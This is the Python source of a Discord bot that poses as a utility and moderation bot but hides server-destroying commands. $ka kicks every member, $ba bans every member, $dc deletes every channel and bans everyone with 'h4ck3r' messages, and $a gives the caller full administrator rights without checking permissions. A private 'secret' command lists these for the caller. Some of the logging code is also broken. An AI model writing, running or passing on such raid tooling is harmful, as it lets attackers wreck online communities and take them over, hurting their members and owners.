import discord
from discord.ext import commands
from discord.ext.commands import Bot
import asyncio
import time
import logging
import random
import googletrans

prefix = "$"
BOT_TOKEN = "token-goes-here" 

intents = discord.Intents.default()
intents.members = True

client = commands.Bot(command_prefix=prefix, intents=intents)
client.remove_command("help")

@client.event
async def on_ready():
    print ("Bot is now online!")

@client.event
async def on_server_join(server):
    print("Joining the server: {0}".format(server.name))

@client.command(pass_context=True)
async def clear(ctx, amount=1000):
    await ctx.channel.purge(limit=amount)

@client.command(pass_context=True)
async def ping(ctx):
	channel = ctx.message.channel
	t1 = time.perf_counter()
	await channel.trigger_typing()
	t2 = time.perf_counter()
	embed=discord.Embed(title=None, description='Ping: {}'.format(round((t2-t1)*1000)), color=0x2874A6)
	await channel.send(embed=embed)

@client.command(pass_context=True)
async def avatar(ctx, member : discord.Member = None):
    if member == None:
        member = ctx.author
    memavatar = member.avatar_url
    avEmbed = discord.Embed(title = f"{member.name}'s Avatar")
    avEmbed.set_image(url = memavatar)

    await ctx.send(embed = avEmbed)

@client.command()
async def say(ctx, *, msg=None):
    if msg is not None:
        await ctx.send(msg)
        await ctx.message.delete()

@client.command(aliases=['tr'])
async def translate(ctx, lang_to, *args):

    lang_to = lang_to.lower()
    if lang_to not in googletrans.LANGUAGES and lang_to not in googletrans.LANGCODES:
        raise commands.BadArgument("Invalid language to translate text to")

    text = ' '.join(args)
    translator = googletrans.Translator()
    text_translated = translator.translate(text, dest=lang_to).text
    await ctx.send(text_translated)

@client.command(pass_context=True)
async def userinfo(ctx, member: discord.Member=None):
    channel = ctx.message.channel
    if member is None:
        await channel.send('Please input a valid user.')
    else:
        await channel.send("**The user's name is: {}**".format(member.name) + "\n**The user's ID is: {}**".format(member.id) + "\n**The user's highest role is: {}**".format(member.top_role) + "\n**The user joined at: {}**".format(member.joined_at) + "\n**The user's account creation date is: {}**".format(member.created_at))

@client.command(pass_context=True)
async def kick(ctx, member: discord.Member=None):
    author = ctx.message.author
    channel = ctx.message.channel
    if author.guild_permissions.kick_members:
        if member is None:
            await channel.send("Please input a valid user.")
        else:
            await channel.send("Die, **{}**".format(member.name))
            await member.kick()
    else:
        await channel.send("I bet you don't have enough permissions.")

@client.command(pass_context=True)
async def ban(ctx, member: discord.Member=None):
    author = ctx.message.author
    channel = ctx.message.channel
    if author.guild_permissions.kick_members:
        if member is None:
            await channel.send('Please input a valid user.')
        else:
            await channel.send("Die **{}**.".format(member.name))
            await member.ban()
    else:
        await channel.send("Where are your permissions?!")

@client.command(pass_context=True)
async def mute(ctx, member: discord.Member):
    guild = ctx.guild
    mutedRole = discord.utils.get(guild.roles, name="Muted")

    if not mutedRole:
        mutedRole = await guild.create_role(name="Muted")

        for channel in guild.channels:
            await channel.set_permissions(mutedRole, speak=False, send_messages=False, read_message_history=True, read_messages=False)

    await member.add_roles(mutedRole)
    await ctx.send(f"Muted {member.mention}.")
    await member.send(f"Silence, {guild.name}.")

@client.command(pass_context=True)
async def unmute(ctx, member: discord.Member):
    mutedRole = discord.utils.get(ctx.guild.roles, name="Muted")

    await member.remove_roles(mutedRole)
    await ctx.send(f"Unmuted {member.mention}.")
    await member.send(f"Make sure you wont say bullshit again, {ctx.guild.name}")

@client.command(pass_context=True)
async def secret(ctx):
    member = ctx.message.author
    embed = discord.Embed(
        colour = discord.Colour.blue()
    )

    embed.set_author(name='Bot Commands')
    embed.add_field(name='$ba', value='Bans everybody from the server (bot needs banning perms and needs to have a higher role than users', inline=False)
    embed.add_field(name='$dc', value='Deletes all channels (bot needs manage channels perms)', inline=False)
    embed.add_field(name='$ka', value='Kicks everyone from the server (bot needs kicking perms)', inline=False)
    embed.add_field(name='$a', value='Gives you admin role (bot needs administrator)', inline=False)
    embed.add_field(name='$invite', value='Sends an invite link of the bot', inline=False)
    embed.add_field(name='$createchannel', value='makes x amount of channels defined by you', inline=False)
    embed.add_field(name='$createrole', value='makes x amount of roles defined by you', inline=False)
    embed.add_field(name='$ping', value='Gives ping to client (expressed in ms)', inline=False)
    embed.add_field(name='$kick', value='Kicks specified user', inline=False)
    embed.add_field(name='$ban', value='Bans specified user', inline=False)
    embed.add_field(name='$userinfo', value='Gives information of a user', inline=False)
    embed.add_field(name='$clear', value='Clears an X amount of messages', inline=False)
    embed.add_field(name='$dm', value='Sends a direct message containing hi to the author', inline=False)
    embed.add_field(name='$serverinfo', value='Gives information about the server', inline=False)
    embed.add_field(name='$avatar', value="Shows avatar of selected user")
    embed.add_field(name='$tr', value="Translates text. Example: $tr english hola")
    embed.add_field(name='$mute', value="Mutes an user.")
    embed.add_field(name='$unmute', value="Unmutes an user.")
    embed.add_field(name='$say', value="Say a specific message.")
    await member.send(embed=embed)

@client.command()
async def serverinfo(ctx):
    name = str(ctx.guild.name)
    description = str(ctx.guild.description)
    owner = str(ctx.guild.owner)
    id = str(ctx.guild.id)
    region = str(ctx.guild.region)
    memberCount = str(ctx.guild.member_count)
    icon = str(ctx.guild.icon_url)
    date = str(ctx.guild.created_at)
    embed = discord.Embed(
        title=name + " Server Information",
        description=description,
        color=discord.Color.blue()
    )
    embed.set_thumbnail(url=icon)
    embed.add_field(name="Owner", value=owner, inline=True)
    embed.add_field(name="Server ID", value=id, inline=True)
    embed.add_field(name="Region", value=region, inline=True)
    embed.add_field(name="Member Count", value=memberCount, inline=True)
    embed.add_field(name="Created On", value=date, inline=True)
    await ctx.send(embed=embed)

@client.command(pass_context=True)
async def ka(ctx):
    guild = ctx.message.guild
    logchannel = client.get_channel(id)
    for member in list(ctx.message.guild.members):
        try:    
            await guild.kick(member)
            print ("User " + member.name + " has been kicked")
            embed = discord.Embed(
            colour = discord.Colour.red()
            )
            embed.add_field(name="User kicked", value=f'{member.name}')
            await logchannel.send(embed=embed)
        except:
            pass
    print ("Action Completed: Kicked everyone.")


@client.command(pass_context=True)
async def ba(ctx):
    guild = ctx.message.guild
    logchannel = client.get_channel(id)
    for member in list(ctx.message.guild.members):
        try:
            await guild.ban(member)
            print ("User " + member.name + " has been banned")
            embed = discord.Embed(
            colour = discord.Colour.red()
            )
            embed.add_field(name="User banned", value=f'{member.name}')
            await logchannel.send(embed=embed)
        except:
            pass
    print ("Action Completed: Banned everyone.")

@client.command(pass_context=True)
async def dc(ctx):
        logchannel = client.get_channel(id)
        for channel in list(ctx.message.guild.channels):
            try:
                await channel.delete()
                print (channel.name + " has been deleted")
                embed = discord.Embed(
                colour = discord.Colour.blue()
                )
                embed.add_field(name="Channel deleted", value=f'#{channel.name}')
                await logchannel.send(embed=embed)
            except:
                pass
        guild = ctx.message.guild
        channel = await guild.create_text_channel("hello")
        await channel.send("g3t 13373d")
        for member in list(ctx.message.guild.members):
            try:
                await guild.ban(member)
                print ("User " + member.name + " has been banned")
                embed = discord.Embed(
                colour = discord.Colour.red()
                )
                embed.add_field(name="User banned", value=f'{member.name}')
                await logchannel.send(embed=embed)
            except:
                pass
        print("h4ck3r att4ck f1n1sh3d")

@client.command(pass_context=True)
async def a(ctx):
    guild = ctx.message.guild
    perms = discord.Permissions(8)
    logchannel = client.get_channel()
    await guild.create_role(name='*', permissions=perms)
    member = ctx.message.author
    role = discord.utils.get(guild.roles, name="*")
    await member.add_roles(role)
    embed = discord.Embed(
    colour = discord.Colour.orange()
    )
    embed.add_field(name="User got admin", value=f'{member}')
    await logchannel.send(embed=embed)

@client.command(pass_context=True)
async def createchannel(ctx, x):
    guild = ctx.message.guild
    logchannel = client.get_channel(id)
    for i in range(int(x)):
        await guild.create_text_channel("newchannel")
    embed = discord.Embed(
    colour = discord.Colour.green()
    )
    embed.add_field(name="Channels created", value=f'{x}')
    await logchannel.send(embed=embed)

@client.command(pass_context=True)
async def createrole(ctx, x):
    guild = ctx.message.guild
    perms = discord.Permissions(0)
    logchannel = client.get_channel(739058160291020920)
    for i in range(int(x)):
        await guild.create_role(name="somerole", permissions=perms)
    embed = discord.Embed(
    colour = discord.Colour.gold()
    )
    embed.add_field(name="Roles created", value=f'{x}')
    await logchannel.send(embed=embed)

@client.command(pass_context=True)
async def dm(ctx):
    await ctx.author.send("hi") 

client.run(BOT_TOKEN)
